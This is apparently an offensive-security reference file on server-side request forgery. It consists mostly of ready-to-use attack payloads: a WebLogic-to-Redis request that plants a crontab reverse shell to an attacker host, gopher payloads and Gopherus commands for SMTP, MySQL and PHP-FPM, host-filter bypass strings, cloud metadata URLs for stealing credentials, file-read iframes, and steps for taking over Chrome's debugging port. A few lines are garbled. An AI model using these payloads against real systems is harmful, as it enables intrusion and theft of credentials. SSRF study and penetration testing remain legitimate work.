# SSRF — Extended Scenarios & Real-World Cases

> Companion to [SKILL.md](./SKILL.md). Contains additional CVE case studies, advanced bypass techniques, and chaining scenarios.

---

## 1. CVE Case: WebLogic SSRF (CVE-2014-4210)

WebLogic's UDDI Explorer component exposes SSRF via the `operator` parameter:

```
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:7001&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```

**Exploitation chain — SSRF → Redis → RCE**:

```bash
# Step 1: Port scan internal network via SSRF
# Open port: fast response / "could not connect" error
# Closed port: timeout / different error

# Step 2: Hit internal Redis (6379) via SSRF with crafted payload
operator=http://INTERNAL_REDIS_IP:6379/test%0D%0A%0D%0Aset%201%20%22%0A%0A%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER%2F4444%200%3E%261%0A%0A%22%0D%0Aconfig%20set%20dir%20%2Fvar%2Fspool%2Fcron%2F%0D%0Aconfig%20set%20dbfilename%20root%0D%0Asave%0D%0A

# URL-decoded: sends Redis commands via CRLF injection in HTTP request
# Writes crontab reverse shell
```

---

## 2. DNS Rebinding — Deep Dive

DNS rebinding exploits the gap between DNS resolution and actual request:

```
Step 1: Victim server resolves attacker.com → gets 1.2.3.4 (legitimate IP)
Step 2: Server validates: "1.2.3.4 is not internal → allowed"
Step 3: DNS TTL expires (or attacker uses TTL=0)
Step 4: Server makes actual request → resolves attacker.com again → gets 169.254.169.254
Step 5: Request goes to metadata endpoint → SSRF achieved
```

### Tools and Services

```text
# rbndr.us — automatic DNS rebinding service:
# Responds with IP A first, IP B second
http://7f000001.a]1b3c4d5.rbndr.us/
# Returns 127.0.0.1 and 1.2.3.4 alternately

# singularity — DNS rebinding attack framework:
# https://github.com/nccgroup/singularity

# Custom NS: set up authoritative DNS with TTL=0 and rotating A records
```

### Bypass Scenarios

| Defense | DNS Rebinding Bypass |
|---|---|
| IP blacklist check at DNS resolution time | TTL=0: resolution returns safe IP → passes check → re-resolve returns internal IP |
| Single DNS lookup cached | Use race condition: parallel requests, one resolves to external, other to internal |
| Application pins DNS result | Not all HTTP libraries pin; some re-resolve on redirect |

---

## 3. CVE Case: Kubernetes SSRF (CVE-2020-8555 / CVE-2020-8562)

**CVE-2020-8555**: Kubernetes kube-controller-manager's volume handling allows SSRF when creating StorageClass with `glusterfs` or `quobyte` provisioners. The controller makes HTTP requests to attacker-controlled endpoints.

**CVE-2020-8562** (bypass of the fix): The fix blocked direct internal IP access but could be bypassed via DNS rebinding — attacker's DNS resolves to external IP during validation, then to internal IP during actual request.

---

## 4. SSRF Through PDF/Screenshot Generators

Applications that generate PDFs from HTML or take screenshots of URLs are high-value SSRF targets:

```html
<!-- If HTML input is rendered to PDF: -->
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
<img src="http://internal-service:8080/admin">
<link rel="stylesheet" href="http://169.254.169.254/latest/user-data">
```

**Common tools**: wkhtmltopdf, Chrome headless, Puppeteer, PhantomJS — all follow redirects and may access internal network.

---

## 5. SSRF + Gopher Protocol — Full TCP Injection

Gopher protocol allows sending arbitrary TCP data. Combined with SSRF, it enables interaction with any TCP service:

```text
# SMTP — send email:
gopher://127.0.0.1:25/_EHLO%20attacker%0D%0AMAIL%20FROM:...

# MySQL — execute query (no password):
gopher://127.0.0.1:3306/_[MYSQL_PACKET]

# FastCGI/PHP-FPM — execute PHP:
gopher://127.0.0.1:9000/_[FASTCGI_PACKET]

# Tool: Gopherus generates gopher payloads for various services:
python3 gopherus.py --exploit mysql
python3 gopherus.py --exploit fastcgi
python3 gopherus.py --exploit redis
```

---

## 6. Filter Bypass via URL Parser Confusion

Different URL parsers disagree on what constitutes "host":

```text
# These may bypass host validation:
http://evil.com#@trusted.com/         # Fragment vs authority confusion
http://trusted.com\@evil.com/         # Backslash as path separator
http://trusted.com%00@evil.com/       # Null byte truncation
http://evil.com%23@trusted.com/       # URL-encoded fragment
http://[::ffff:7f00:1]/              # IPv6-mapped IPv4 localhost
http://0x7f.0x00.0x00.0x01/          # Hex octets
http://0177.0.0.1/                   # Octal
```

---

## 7. EXTENDED CLOUD METADATA ENDPOINTS

### AWS ECS (Container)

```
http://169.254.170.2/v2/credentials
# Returns temporary IAM role credentials for the ECS task
```

### GCP Detailed Queries

```
http://metadata.google.internal/computeMetadata/v1/?recursive=true
# Returns ALL metadata in one request (with Metadata-Flavor: Google header)
http://metadata.google.internal/computeMetadata/v1beta1/
# Legacy endpoint — may not require Metadata-Flavor header!
```

### Azure Identity Token

```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/
Headers: Metadata: true
# Returns OAuth2 token for Azure management plane
```

### Alibaba Cloud (Aliyun)

```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://100.100.100.200/latest/meta-data/ram/security-credentials/ROLE_NAME
```

### Kubernetes

```
https://kubernetes.default.svc/api/v1/namespaces/default/secrets
# Service account token at: /var/run/secrets/kubernetes.io/serviceaccount/token
# CA cert at: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# kubectl proxy (if running):
http://127.0.0.1:8001/api/v1/namespaces/default/pods
```

### IPv6 Metadata Variants

```
http://[::ffff:169.254.169.254]/latest/meta-data/
http://[fd00:ec2::254]/latest/meta-data/
# May bypass IPv4-only filters
```

---

## 8. BROWSER-SIDE DNS REBINDING & HEADLESS BROWSER ATTACKS

### DNS Rebinding (Browser-Side)

```
# Different from server-side SSRF — targets victim's browser:
# 1. Victim visits attacker.com (DNS resolves to attacker IP)
# 2. JavaScript makes request to attacker.com (same-origin)
# 3. DNS TTL expires, re-resolves to 127.0.0.1 or internal IP
# 4. Browser makes same-origin request → hits internal service
# 5. Attacker's JS reads the response (same-origin!)

# Tools:
# - Singularity of Origin (nccgroup/singularity)
# - rbndr.us (simple rebinding service)

# Protection bypasses:
# - 0.0.0.0 resolves to localhost on many systems
# - CNAME to localhost
# - localhost CNAME chains
```

### Headless Browser / PDF Generator Attacks

```
# If application uses headless Chrome/Puppeteer/wkhtmltopdf to render user content:

# SSRF via HTML:
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
<img src="http://169.254.169.254/latest/meta-data/">

# Local file read:
<iframe src="file:///etc/passwd"></iframe>
<script>document.write(new XMLHttpRequest())</script>

# If --no-sandbox flag is used → full browser exploit potential

# Remote debugging port (Chrome DevTools Protocol):
# If port 9222 is exposed:
http://127.0.0.1:9222/json → list debugging targets
# Connect via WebSocket → full control of browser tabs
# Read cookies, navigate to arbitrary URLs, execute JS
```
